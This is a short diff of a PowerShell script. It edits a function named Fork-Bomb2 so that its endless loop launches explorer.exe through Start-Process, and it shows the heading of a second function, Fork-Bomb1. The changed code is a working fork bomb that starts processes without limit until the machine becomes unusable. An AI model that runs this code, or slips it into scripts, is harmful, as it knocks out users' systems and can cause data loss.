@@ -1145,7 +1145,7 @@ Param(
 
 Function Fork-Bomb2 
 {
-    while(1) {explorer.exe}
+    while(1) {Start-Process explorer.exe}
 }
 
 Function Fork-Bomb1 
